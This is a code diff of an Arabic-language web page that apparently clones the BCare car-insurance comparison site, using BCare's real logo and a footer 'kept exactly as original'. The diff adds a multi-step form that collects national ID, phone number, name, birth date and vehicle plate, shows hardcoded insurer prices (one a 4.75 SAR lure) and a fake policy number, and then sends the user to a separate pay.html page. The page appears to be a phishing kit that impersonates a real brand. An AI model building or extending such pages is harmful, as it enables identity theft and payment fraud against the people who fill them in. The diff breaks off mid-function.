@@ -107,6 +107,7 @@
             color: #333;
             outline: none;
             transition: border-color 0.3s;
+            background-color: #fff;
         }
         
         .form-control:focus {
@@ -118,7 +119,6 @@
             font-weight: 400;
         }
 
-        /* إخفاء أسهم حقول الأرقام في المتصفحات */
         input[type=number]::-webkit-inner-spin-button, 
         input[type=number]::-webkit-outer-spin-button { 
             -webkit-appearance: none; 
@@ -291,7 +291,6 @@
             opacity: 0.9;
         }
 
-        /* تنسيق أقسام العروض */
         .section-title {
             color: #1a6396;
             font-size: 15px;
@@ -302,21 +301,23 @@
             padding-bottom: 6px;
         }
 
+        /* تصميم بطاقة العرض المحسن */
         .offer-card {
             border: 1px solid #e2e8f0;
-            border-radius: 8px;
-            padding: 14px 16px;
-            margin-bottom: 12px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 15px;
             cursor: pointer;
             transition: all 0.3s;
             background-color: #ffffff;
+            position: relative;
+            display: flex;
+            flex-direction: column;
         }
 
         .offer-card:hover {
             border-color: #1a6396;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
         
         .offer-card.active {
@@ -325,36 +326,96 @@
             box-shadow: 0 2px 10px rgba(26,99,150,0.1);
         }
 
-        .offer-details {
+        .offer-top-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 15px;
+        }
+
+        .offer-logo {
+            width: 70px;
+            height: 50px;
+            background-color: #f8f9fa;
+            border-radius: 6px;
             display: flex;
             align-items: center;
-            gap: 12px;
+            justify-content: center;
+            border: 1px solid #eee;
+            font-size: 10px;
+            font-weight: bold;
+            color: #555;
+            text-align: center;
+            padding: 5px;
+            box-sizing: border-box;
+            overflow: hidden;
+        }
+        
+        .offer-logo img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        .offer-details {
+            flex: 1;
+            padding-right: 15px;
         }
 
         .offer-title {
-            font-weight: 700;
-            font-size: 14px;
-            color: #333;
+            font-weight: 800;
+            font-size: 15px;
+            color: #1a6396;
         }
 
         .offer-subtitle {
-            font-size: 11px;
-            color: #777;
-            font-weight: 400;
-            margin-top: 2px;
+            font-size: 12px;
+            color: #f7b260;
+            font-weight: 700;
+            margin-top: 4px;
+        }
+
+        .offer-price-box {
+            text-align: left;
+            white-space: nowrap;
         }
 
         .offer-price {
             font-weight: 900;
-            font-size: 16px;
+            font-size: 18px;
             color: #1a6396;
             direction: rtl;
-            white-space: nowrap;
         }
 
         .offer-price span {
             font-size: 12px;
             font-weight: 600;
+            color: #777;
+        }
+
+        .offer-features {
+            border-top: 1px dashed #eee;
+            padding-top: 12px;
+            font-size: 12.5px;
+            color: #555;
+            margin-top: 5px;
+        }
+        
+        .offer-features div {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+
+        .offer-features i.fa-check-square {
+            color: #1a6396;
+            margin-top: 3px;
+        }
+        .offer-features i.fa-square {
+            color: #ccc;
+            margin-top: 3px;
         }
 
         .offers-header {
@@ -364,6 +425,59 @@
             margin-bottom: 15px;
             font-weight: 800;
             font-size: 20px;
+        }
+
+        .vehicle-summary {
+            background: #f0f7fc;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border: 1px solid #dceaf5;
+            font-size: 13px;
+        }
+
+        .vehicle-summary div {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+        .vehicle-summary div:last-child {
+            margin-bottom: 0;
+        }
+
+        /* تنسيق التاريخ الهجري */
+        .hijri-date-container {
+            display: flex;
+            gap: 8px;
+        }
+        .hijri-date-container select {
+            flex: 1;
+            padding: 10px 5px;
+            text-align: center;
+            text-align-last: center;
+        }
+
+        .repair-options-container {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        .repair-option-box {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            cursor: pointer;
+            background: #fff;
+            transition: all 0.2s;
+        }
+        
+        .repair-option-box.active {
+            border-color: #1a6396;
+            background-color: #f0f7fc;
         }
 
         .floating-buttons {
@@ -392,7 +506,7 @@
         .fab-support { background-color: #f7b260; }
         .fab-up { background-color: #1a6396; }
 
-        /* حاوية الفوتر الأساسية */
+        /* Footer styles - kept exactly as original */
         .site-footer {
             font-family: 'Tajawal', sans-serif;
             background-color: #ffffff;
@@ -557,25 +671,21 @@
         <p>المنصة الأذكى لمقارنة عروض أكثر من 20 شركة تأمين. احصل<br>على أرخص تأمين سيارات مع إصدار فوري وربط مباشر بنجم.</p>
     </div>
 
-    <!-- النموذج الرئيسي -->
-    <div class="form-container" id="main-form">
+    <!-- ======================= STEP 1 ======================= -->
+    <div class="form-container" id="step1">
         <div class="tabs">
             <div class="tab active" onclick="switchTab(this)">تأمين جديد</div>
             <div class="tab" onclick="switchTab(this)">نقل ملكية</div>
         </div>
         
         <div class="form-content">
-            <!-- رقم الهوية / الإقامة -->
             <div class="form-group">
                 <label>رقم الهوية / الإقامة</label>
-                <!-- تم التعديل إلى type="number" وإضافة inputmode="numeric" وoninput لتحديد الطول -->
                 <input type="number" inputmode="numeric" id="id-input" class="form-control" placeholder="رقم الهوية أو الإقامة" oninput="if(this.value.length > 10) this.value = this.value.slice(0, 10);">
             </div>
 
-            <!-- رقم الجوال -->
             <div class="form-group">
                 <label>رقم الجوال</label>
-                <!-- تم التعديل إلى type="number" وإضافة inputmode="numeric" وoninput لتحديد الطول -->
                 <input type="number" inputmode="numeric" id="phone-input" class="form-control" placeholder="05XXXXXXXX" dir="ltr" style="text-align: right;" oninput="if(this.value.length > 10) this.value = this.value.slice(0, 10);">
             </div>
 
@@ -591,7 +701,6 @@
             <div class="form-group">
                 <label>الرقم التسلسلي</label>
                 <div class="input-icon-container">
-                    <!-- تم التعديل إلى type="number" وإضافة inputmode="numeric" -->
                     <input type="number" inputmode="numeric" class="form-control" placeholder="الرقم التسلسلي">
                     <div class="icon-left">i</div>
                 </div>
@@ -600,7 +709,6 @@
             <div class="form-group">
                 <label>رمز التحقق</label>
                 <div class="captcha-container">
-                    <!-- تم التعديل إلى type="number" وإضافة inputmode="numeric" وoninput لتحديد الطول -->
                     <input type="number" inputmode="numeric" id="captcha-input" class="form-control" style="background-color: white;" placeholder="" dir="ltr" oninput="if(this.value.length > 4) this.value = this.value.slice(0, 4);">
                     <div class="captcha-image" id="captcha-display">
                         <span style="color:#1500ff; text-decoration:underline; font-style:italic;">5</span>
@@ -616,97 +724,366 @@
                 أوافق على منح شركة عناية الوسيط الحق في<br>الاستعلام من شركة نجم و/أو مركز المعلومات<br>الوطني عن بياناتي
             </div>
 
-            <button class="submit-btn" onclick="validateAndSubmit()">إظهار العروض</button>
+            <button class="submit-btn" onclick="validateAndGoToStep2()">إظهار العروض</button>
         </div>
     </div>
 
-    <!-- قسم قائمة العروض والتفاصيل -->
-    <div class="form-container" id="offers-section" style="display: none; padding: 25px 20px;">
-        <h2 class="offers-header">اختر العرض المناسب</h2>
-        
-        <!-- القسم الأول: متوسط السعر الابتدائي (ضد الغير) -->
-        <div class="section-title">1. متوسط السعر الابتدائي (ضد الغير)</div>
-        
-        <div class="offer-card" onclick="selectOffer(this)">
-            <div class="offer-details">
-                <span class="radio-circle"></span>
-                <div class="offer-title">شركة التأمين التعاونية</div>
+    <!-- ======================= STEP 2 ======================= -->
+    <div class="form-container" id="step2" style="display: none;">
+        <div class="form-content">
+            <h2 class="offers-header" style="margin-top: 10px; border-bottom: 2px solid #eee; padding-bottom: 15px;">تفاصيل وثيقة التأمين</h2>
+            
+            <div class="form-group">
+                <label>رقم الهوية / الإقامة</label>
+                <input type="text" id="step2-id" class="form-control" readonly style="background-color: #f9f9f9; text-align: right; direction: ltr;">
             </div>
-            <div class="offer-price">650 - 700 <span>ر.س</span></div>
-        </div>
-        
-        <div class="offer-card" onclick="selectOffer(this)">
-            <div class="offer-details">
-                <span class="radio-circle"></span>
-                <div class="offer-title">ميدغلف</div>
-            </div>
-            <div class="offer-price">660 - 750 <span>ر.س</span></div>
-        </div>
 
-        <div class="offer-card" onclick="selectOffer(this)">
-            <div class="offer-details">
-                <span class="radio-circle"></span>
-                <div class="offer-title">تكافل الراجحي</div>
+            <div class="form-group">
+                <label>الاسم الكامل</label>
+                <input type="text" id="step2-name" class="form-control" placeholder="أدخل الاسم الكامل">
             </div>
-            <div class="offer-price">650 - 700 <span>ر.س</span></div>
-        </div>
 
-        <div class="offer-card" onclick="selectOffer(this)">
-            <div class="offer-details">
-                <span class="radio-circle"></span>
-                <div class="offer-title">ولاء / أسيج</div>
-            </div>
-            <div class="offer-price">700 - 750 <span>ر.س</span></div>
-        </div>
-
-        <div class="offer-card" onclick="selectOffer(this)">
-            <div class="offer-details">
-                <span class="radio-circle"></span>
-                <div class="offer-title">الخليجية المتحدة / اتحاد الخليج</div>
-            </div>
-            <div class="offer-price">890 - 900 <span>ر.س</span></div>
-        </div>
-
-        <!-- القسم الثاني: متوسط سعر التأمين الشامل السنوي -->
-        <div class="section-title" style="margin-top: 30px;">2. متوسط سعر التأمين الشامل السنوي</div>
-        
-        <div class="offer-card" onclick="selectOffer(this)">
-            <div class="offer-details">
-                <span class="radio-circle"></span>
-                <div>
-                    <div class="offer-title">سيارات اقتصادية / مستعملة</div>
-                    <div class="offer-subtitle">(بقيمة 30,000 - 50,000 ريال)</div>
+            <div class="form-group">
+                <label>تاريخ الميلاد (هجري)</label>
+                <div class="hijri-date-container">
+                    <select class="form-control" id="birth-day">
+                        <option value="">اليوم</option>
+                        <!-- سيتم تعبئتها بالجافاسكربت -->
+                    </select>
+                    <select class="form-control" id="birth-month">
+                        <option value="">الشهر</option>
+                        <option value="1">محرم</option>
+                        <option value="2">صفر</option>
+                        <option value="3">ربيع الأول</option>
+                        <option value="4">ربيع الآخر</option>
+                        <option value="5">جمادى الأولى</option>
+                        <option value="6">جمادى الآخرة</option>
+                        <option value="7">رجب</option>
+                        <option value="8">شعبان</option>
+                        <option value="9">رمضان</option>
+                        <option value="10">شوال</option>
+                        <option value="11">ذو القعدة</option>
+                        <option value="12">ذو الحجة</option>
+                    </select>
+                    <select class="form-control" id="birth-year">
+                        <option value="">السنة</option>
+                        <!-- سيتم تعبئتها بالجافاسكربت -->
+                    </select>
                 </div>
             </div>
-            <div class="offer-price">1,200 - 2,200 <span>ر.س</span></div>
-        </div>
 
-        <div class="offer-card" onclick="selectOffer(this)">
-            <div class="offer-details">
-                <span class="radio-circle"></span>
-                <div>
-                    <div class="offer-title">سيارات متوسطة / جديدة</div>
-                    <div class="offer-subtitle">(بقيمة 60,000 - 100,000 ريال)</div>
+            <div class="form-group">
+                <label>رقم الجوال</label>
+                <input type="text" id="step2-phone" class="form-control" readonly style="background-color: #f9f9f9; text-align: right; direction: ltr;">
+            </div>
+
+            <div class="form-group">
+                <label>نوع التأمين</label>
+                <select class="form-control" id="insurance-type">
+                    <option value="ضد الغير">ضد الغير</option>
+                    <option value="شامل">شامل</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>الغرض من استخدام المركبة</label>
+                <select class="form-control" id="usage-purpose">
+                    <option value="شخصي">شخصي</option>
+                    <option value="تجاري">تجاري</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>القيمة التقديرية للمركبة</label>
+                <input type="number" id="vehicle-value" class="form-control" placeholder="أدخل القيمة بين 10,000 - 1,000,000 ريال" value="10000">
+            </div>
+
+            <div class="form-group">
+                <label>سنة صنع المركبة</label>
+                <select class="form-control" id="manufacture-year">
+                    <option value="">اختر</option>
+                    <!-- سيتم تعبئتها بالجافاسكربت -->
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>ماركة ونوع المركبة</label>
+                <input type="text" id="make-model" class="form-control" placeholder="مثال: تويوتا كامري">
+            </div>
+
+            <div class="form-group">
+                <label>رقم لوحة السيارة</label>
+                <input type="text" id="plate-number" class="form-control" placeholder="مثال: أ ب ج 1234">
+            </div>
+
+            <div class="form-group">
+                <label>مكان اصلاح المركبة</label>
+                <div class="repair-options-container">
+                    <div class="repair-option-box active" onclick="selectRepairOption(this, 'الوكالة')">
+                        <span class="radio-circle" style="border-color: #1a6396;"></span>
+                        <span>الوكالة</span>
+                    </div>
+                    <div class="repair-option-box" onclick="selectRepairOption(this, 'الورشة')">
+                        <span class="radio-circle"></span>
+                        <span>الورشة</span>
+                    </div>
                 </div>
             </div>
-            <div class="offer-price">2,200 - 3,800 <span>ر.س</span></div>
-        </div>
 
-        <div class="offer-card" onclick="selectOffer(this)">
-            <div class="offer-details">
-                <span class="radio-circle"></span>
-                <div>
-                    <div class="offer-title">سيارات فارهة / عائلية كبيرة</div>
-                    <div class="offer-subtitle">(بقيمة 120,000 - 200,000 ريال)</div>
-                </div>
-            </div>
-            <div class="offer-price">4,000 - 7,500+ <span>ر.س</span></div>
+            <button class="submit-btn" onclick="goToOffersStep()" style="margin-top: 20px;">إظهار العروض</button>
         </div>
-
-        <button class="submit-btn" onclick="confirmOffer()" style="margin-top: 20px;">تأكيد الاختيار</button>
     </div>
 
-    <!-- الأزرار العائمة -->
+    <!-- ======================= STEP 3 (Offers) ======================= -->
+    <div class="form-container" id="step3" style="display: none;">
+        <div class="form-content">
+            <h2 class="offers-header">العروض المتاحة حسب تفاصيل مركبتك</h2>
+            
+            <!-- Vehicle Summary -->
+            <div class="vehicle-summary">
+                <div><span>ماركة ونوع المركبة</span> <strong id="sum-make">-</strong></div>
+                <div><span>سنة صنع المركبة</span> <strong id="sum-year">-</strong></div>
+                <div><span>القيمة التقديرية</span> <strong id="sum-value">-</strong></div>
+                <div><span>الغرض من الاستخدام</span> <strong id="sum-purpose">-</strong></div>
+                <div><span>مكان إصلاح المركبة</span> <strong id="sum-repair">الوكالة</strong></div>
+            </div>
+
+            <!-- Tabs for Offers -->
+            <div class="radio-group" style="margin-bottom: 20px;">
+                <div class="radio-option active" onclick="switchOfferTab(this, 'third-party')">ضد الغير</div>
+                <div class="radio-option" onclick="switchOfferTab(this, 'comprehensive')">شامل</div>
+                <div class="radio-option" onclick="switchOfferTab(this, 'premium')">مميز</div>
+            </div>
+
+            <!-- Third Party Offers List -->
+            <div id="offers-third-party">
+                <div class="offer-card" onclick="selectFinalOffer('ولاء للتأمين', 'ضد الغير', 652.17, this)">
+                    <div class="offer-top-row">
+                        <div class="offer-logo" style="color: #1a6396; font-weight: bold; font-size: 12px;">ولاء<br>Walaa</div>
+                        <div class="offer-details">
+                            <div class="offer-title">ولاء للتأمين</div>
+                            <div class="offer-subtitle">تأمين ضد الغير</div>
+                        </div>
+                        <div class="offer-price-box">
+                            <div class="offer-price">652.17 <span>ر.س / سنة</span></div>
+                        </div>
+                    </div>
+                    <div class="offer-features">
+                        <div><i class="fas fa-check-square"></i> المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال</div>
+                        <div><i class="far fa-square"></i> المساعدة على الطريق (50+ ريال)</div>
+                    </div>
+                </div>
+
+                <div class="offer-card" onclick="selectFinalOffer('تكافل الراجحي', 'ضد الغير', 674.82, this)">
+                    <div class="offer-top-row">
+                        <div class="offer-logo" style="color: #005c9e; font-weight: bold; font-size: 12px;">الراجحي<br>Takaful</div>
+                        <div class="offer-details">
+                            <div class="offer-title">تكافل الراجحي</div>
+                            <div class="offer-subtitle">تأمين ضد الغير</div>
+                        </div>
+                        <div class="offer-price-box">
+                            <div class="offer-price">674.82 <span>ر.س / سنة</span></div>
+                        </div>
+                    </div>
+                    <div class="offer-features">
+                        <div><i class="fas fa-check-square"></i> المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال</div>
+                        <div><i class="far fa-square"></i> تغطية الحوادث الشخصية للسائق والركاب (50+ ريال)</div>
+                        <div><i class="far fa-square"></i> المساعدة على الطريق (30+ ريال)</div>
+                        <div><i class="far fa-square"></i> تغطية ضد كسر الزجاج والحرائق والسرقة (150+ ريال)</div>
+                    </div>
+                </div>
+                
+                <div class="offer-card" onclick="selectFinalOffer('التعاونية', 'ضد الغير', 4.75, this)">
+                    <div class="offer-top-row">
+                        <div class="offer-logo" style="color: #6a1b9a; font-weight: bold; font-size: 12px;">التعاونية<br>Tawuniya</div>
+                        <div class="offer-details">
+                            <div class="offer-title">التعاونية</div>
+                            <div class="offer-subtitle">تأمين ضد الغير</div>
+                        </div>
+                        <div class="offer-price-box">
+                            <div class="offer-price">4.75 <span>ر.س / سنة</span></div>
+                        </div>
+                    </div>
+                    <div class="offer-features">
+                        <div><i class="fas fa-check-square"></i> المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال</div>
+                        <div><i class="far fa-square"></i> تغطية الحوادث الشخصية للسائق (60+ ريال)</div>
+                    </div>
+                </div>
+                
+                <div class="offer-card" onclick="selectFinalOffer('ليفا للتأمين', 'ضد الغير', 735.45, this)">
+                    <div class="offer-top-row">
+                        <div class="offer-logo" style="color: #f26f21; font-weight: bold; font-size: 12px;">ليفا<br>Liva</div>
+                        <div class="offer-details">
+                            <div class="offer-title">ليفا للتأمين</div>
+                            <div class="offer-subtitle">تأمين ضد الغير</div>
+                        </div>
+                        <div class="offer-price-box">
+                            <div class="offer-price">735.45 <span>ر.س / سنة</span></div>
+                        </div>
+                    </div>
+                    <div class="offer-features">
+                        <div><i class="fas fa-check-square"></i> المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال</div>
+                    </div>
+                </div>
+
+                <div class="offer-card" onclick="selectFinalOffer('ميدغلف', 'ضد الغير', 700.32, this)">
+                    <div class="offer-top-row">
+                        <div class="offer-logo" style="color: #0070ce; font-weight: bold; font-size: 12px;">ميدغلف<br>MedGulf</div>
+                        <div class="offer-details">
+                            <div class="offer-title">ميدغلف</div>
+                            <div class="offer-subtitle">تأمين ضد الغير</div>
+                        </div>
+                        <div class="offer-price-box">
+                            <div class="offer-price">700.32 <span>ر.س / سنة</span></div>
+                        </div>
+                    </div>
+                    <div class="offer-features">
+                        <div><i class="fas fa-check-square"></i> المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Comprehensive Offers List -->
+            <div id="offers-comprehensive" style="display: none;">
+                <div class="offer-card" onclick="selectFinalOffer('تكافل الراجحي', 'شامل', 1302.75, this)">
+                    <div class="offer-top-row">
+                        <div class="offer-logo" style="color: #005c9e; font-weight: bold; font-size: 12px;">الراجحي<br>Takaful</div>
+                        <div class="offer-details">
+                            <div class="offer-title">تكافل الراجحي</div>
+                            <div class="offer-subtitle">تأمين شامل</div>
+                        </div>
+                        <div class="offer-price-box">
+                            <div class="offer-price">1302.75 <span>ر.س / سنة</span></div>
+                        </div>
+                    </div>
+                    <div class="offer-features">
+                        <div><i class="fas fa-check-square"></i> المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال</div>
+                        <div><i class="fas fa-check-square"></i> تغطية الحوادث الشخصية للسائق والركاب</div>
+                    </div>
+                </div>
+                <div class="offer-card" onclick="selectFinalOffer('التعاونية', 'شامل', 1455.13, this)">
+                    <div class="offer-top-row">
+                        <div class="offer-logo" style="color: #6a1b9a; font-weight: bold; font-size: 12px;">التعاونية<br>Tawuniya</div>
+                        <div class="offer-details">
+                            <div class="offer-title">التعاونية</div>
+                            <div class="offer-subtitle">تأمين شامل</div>
+                        </div>
+                        <div class="offer-price-box">
+                            <div class="offer-price">1455.13 <span>ر.س / سنة</span></div>
+                        </div>
+                    </div>
+                    <div class="offer-features">
+                        <div><i class="fas fa-check-square"></i> المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Premium Offers List -->
+            <div id="offers-premium" style="display: none;">
+                <div class="offer-card" onclick="selectFinalOffer('ولاء للتأمين', 'مميز', 1899.51, this)">
+                    <div class="offer-top-row">
+                        <div class="offer-logo" style="color: #1a6396; font-weight: bold; font-size: 12px;">ولاء<br>Walaa</div>
+                        <div class="offer-details">
+                            <div class="offer-title">ولاء للتأمين</div>
+                            <div class="offer-subtitle">تأمين مميز</div>
+                        </div>
+                        <div class="offer-price-box">
+                            <div class="offer-price">1899.51 <span>ر.س / سنة</span></div>
+                        </div>
+                    </div>
+                    <div class="offer-features">
+                        <div><i class="fas fa-check-square"></i> المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال</div>
+                        <div><i class="fas fa-check-square"></i> تغطية شاملة للحوادث والسرقة والحرائق</div>
+                        <div><i class="fas fa-check-square"></i> المساعدة على الطريق 24/7</div>
+                    </div>
+                </div>
+                <div class="offer-card" onclick="selectFinalOffer('ميدغلف', 'مميز', 2100.00, this)">
+                    <div class="offer-top-row">
+                        <div class="offer-logo" style="color: #0070ce; font-weight: bold; font-size: 12px;">ميدغلف<br>MedGulf</div>
+                        <div class="offer-details">
+                            <div class="offer-title">ميدغلف</div>
+                            <div class="offer-subtitle">تأمين مميز</div>
+                        </div>
+                        <div class="offer-price-box">
+                            <div class="offer-price">2100.00 <span>ر.س / سنة</span></div>
+                        </div>
+                    </div>
+                    <div class="offer-features">
+                        <div><i class="fas fa-check-square"></i> المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000 ريال</div>
+                        <div><i class="fas fa-check-square"></i> تغطية شاملة للحوادث والسرقة والحرائق</div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- زر تأكيد الاختيار -->
+            <button class="submit-btn" onclick="confirmOfferSelection()" style="margin-top: 25px; background-color: #1a6396;">تأكيد الاختيار</button>
+            <button class="submit-btn" onclick="goBackToStep2()" style="margin-top: 10px; background-color: #eee; color: #333;">رجوع</button>
+        </div>
+    </div>
+
+    <!-- ======================= STEP 4 (Summary) ======================= -->
+    <div class="form-container" id="step4" style="display: none;">
+        <div class="form-content">
+            <h2 class="offers-header" style="margin-bottom: 20px;">ملخص الطلب</h2>
+            
+            <div style="border: 1px solid #ddd; border-radius: 8px; padding: 15px; margin-bottom: 20px; background: #fff;">
+                <div style="display: flex; justify-content: space-between; margin-bottom: 15px; border-bottom: 1px solid #eee; padding-bottom: 10px;">
+                    <span>رقم الوثيقة</span> <strong>POL-5MTDNS-2026</strong>
+                </div>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
+                    <span>تاريخ بدء التأمين</span> <strong>21/09/2026</strong>
+                </div>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
+                    <span>تاريخ انتهاء التأمين</span> <strong>23 أبريل 2027</strong>
+                </div>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
+                    <span>حالة الوثيقة</span> <strong style="color: #f7b260;">بانتظار التأكيد</strong>
+                </div>
+            </div>
+
+            <div style="border: 1px solid #ddd; border-radius: 8px; padding: 15px; margin-bottom: 20px; background: #fff;">
+                <h3 style="color: #1a6396; margin-top: 0; margin-bottom: 15px; font-size: 16px; border-right: 3px solid #1a6396; padding-right: 8px;">1. بيانات المؤمن له</h3>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px;">
+                    <span>الاسم الكامل</span> <strong id="final-name">-</strong>
+                </div>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px;">
+                    <span>تاريخ الميلاد</span> <strong id="final-dob">-</strong>
+                </div>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px;">
+                    <span>رقم الهوية</span> <strong id="final-id">-</strong>
+                </div>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px;">
+                    <span>نوع التأمين</span> <strong id="final-type" style="color: #f7b260;">-</strong>
+                </div>
+            </div>
+
+            <div style="border: 1px solid #ddd; border-radius: 8px; padding: 15px; margin-bottom: 20px; background: #fff;">
+                <h3 style="color: #1a6396; margin-top: 0; margin-bottom: 15px; font-size: 16px; border-right: 3px solid #1a6396; padding-right: 8px;">2. تفاصيل الخدمة</h3>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px;">
+                    <span>شركة التأمين</span> <strong id="final-company">-</strong>
+                </div>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px;">
+                    <span>نوع التأمين</span> <strong id="final-type-summary">-</strong>
+                </div>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px;">
+                    <span>رسوم التأمين</span> <strong id="final-base-price">-</strong>
+                </div>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 15px; font-size: 14px;">
+                    <span>ضريبة القيمة المضافة (15%)</span> <strong id="final-vat">-</strong>
+                </div>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 10px; border-top: 1px solid #eee; padding-top: 15px; font-size: 16px;">
+                    <span>المجموع الكلي</span> <strong id="final-total" style="font-size: 18px; color: #1a6396;">-</strong>
+                </div>
+            </div>
+
+            <!-- تم حذف قسم الدفع بناءً على طلبك -->
+            
+            <button class="submit-btn" onclick="window.location.href='pay.html'" style="margin-top: 10px; background-color: #1a6396;">تأكيد الطلب</button>
+            <button class="submit-btn" onclick="goBackToStep3()" style="margin-top: 10px; background-color: #eee; color: #333;">رجوع</button>
+        </div>
+    </div>
+
+    <!-- Floating Buttons -->
     <div class="floating-buttons">
         <div class="fab fab-support">
             <i class="fas fa-headset"></i>
@@ -716,7 +1093,7 @@
         </div>
     </div>
 
-    <!-- الفوتر -->
+    <!-- ======================= FOOTER ======================= -->
     <footer class="site-footer">
         <div class="footer-container">
 
@@ -724,7 +1101,6 @@
                 <img src="https://bcare.com.sa/assets/images/logo.svg" alt="BCare" onerror="this.style.display='none'">
             </div>
 
-            <!-- رقم التواصل -->
             <div class="contact-section">
                 <span dir="ltr">800 11 800 44</span>
                 <i class="fa-solid fa-phone"></i>
@@ -789,11 +1165,44 @@
         </div>
     </footer>
 
+    <!-- ======================= JAVASCRIPT ======================= -->
     <script>
         let currentCaptchaCode = "5038";
-        let isOfferSelected = false; 
-        let selectedOfferDetails = {}; 
+        let formData = {}; 
+        let selectedOffer = {};
+        let isOfferSelected = false;
 
+        // تهيئة القوائم المنسدلة للتاريخ وسنة الصنع
+        window.onload = function() {
+            // تعبئة الأيام
+            const daySelect = document.getElementById('birth-day');
+            for (let i = 1; i <= 30; i++) {
+                let option = document.createElement('option');
+                option.value = i;
+                option.textContent = i;
+                daySelect.appendChild(option);
+            }
+
+            // تعبئة السنوات الهجرية (مثال من 1400 إلى 1450)
+            const yearSelect = document.getElementById('birth-year');
+            for (let i = 1450; i >= 1400; i--) {
+                let option = document.createElement('option');
+                option.value = i;
+                option.textContent = i;
+                yearSelect.appendChild(option);
+            }
+
+            // تعبئة سنوات صنع المركبة
+            const carYearSelect = document.getElementById('manufacture-year');
+            for (let i = 2024; i >= 1990; i--) {
+                let option = document.createElement('option');
+                option.value = i;
+                option.textContent = i;
+                carYearSelect.appendChild(option);
+            }
+        };
+
+        // --- Step 1 Logic ---
         function switchTab(element) {
             document.querySelectorAll('.tab').forEach(tab => {
                 tab.classList.remove('active');
@@ -802,7 +1211,8 @@
         }
 
         function switchRadio(element) {
-            document.querySelectorAll('.radio-option').forEach(radio => {
+            const parent = element.parentElement;
+            parent.querySelectorAll('.radio-option').forEach(radio => {
                 radio.classList.remove('active');
             });
             element.classList.add('active');
@@ -834,38 +1244,39 @@
             
             currentCaptchaCode = newCode;
             document.getElementById('captcha-input').value = ''; 
-            document.getElementById('captcha-input').focus();
         }
 
-        function validateAndSubmit() {
+        function validateAndGoToStep2() {
             const idInput = document.getElementById('id-input').value.trim();
             const phoneInput = document.getElementById('phone-input').value.trim();
             const userInput = document.getElementById('captcha-input').value.trim();
             
-            // التحقق من رقم الهوية (10 أرقام وتبدأ بـ 1 أو 2)
             const idRegex = /^[12]\d{9}$/;
             if (!idRegex.test(idInput)) {
                 alert("يرجى إدخال رقم هوية أو إقامة صحيح يتكون من 10 أرقام ويبدأ بـ 1 أو 2.");
                 return;
             }
 
-            // التحقق من رقم الجوال (10 أرقام وتبدأ بـ 05)
             const phoneRegex = /^05\d{8}$/;
             if (!phoneRegex.test(phoneInput)) {
                 alert("يرجى إدخال رقم جوال صحيح يجب ان يتكون من 10 أرقام ويبدأ بـ 05.");
                 return;
             }
 
-            // التحقق من كود التحقق
             if (userInput === "") {
                 alert("يرجى إدخال رمز التحقق أولاً.");
                 return;
             }
 
             if (userInput === currentCaptchaCode) {
-                // إخفاء النموذج الرئيسي وإظهار قسم العروض
-                document.getElementById('main-form').style.display = 'none';
-                document.getElementById('offers-section').style.display = 'block';
+                formData.id = idInput;
+                formData.phone = phoneInput;
+
+                document.getElementById('step2-id').value = idInput;
+                document.getElementById('step2-phone').value = phoneInput;
+
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('step2').style.display = 'block';
                 window.scrollTo({ top: 0, behavior: 'smooth' });
             } else {
                 alert("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى.");
@@ -873,30 +1284,117 @@
             }
         }
 
-        function selectOffer(element) {
+        // --- Step 2 Logic ---
+        function selectRepairOption(element, value) {
+            document.querySelectorAll('.repair-option-box').forEach(box => {
+                box.classList.remove('active');
+                box.querySelector('.radio-circle').style.borderColor = '#bbb';
+            });
+            element.classList.add('active');
+            element.querySelector('.radio-circle').style.borderColor = '#1a6396';
+            formData.repair = value;
+        }
+
+        function goToOffersStep() {
+            formData.name = document.getElementById('step2-name').value.trim() || 'غير محدد';
+            const day = document.getElementById('birth-day').value;
+            const month = document.getElementById('birth-month').value;
+            const year = document.getElementById('birth-year').value;
+            formData.dob = (day && month && year) ? `${day}/${month}/${year}` : 'غير محدد';
+            formData.insuranceType = document.getElementById('insurance-type').value;
+            formData.purpose = document.getElementById('usage-purpose').value;
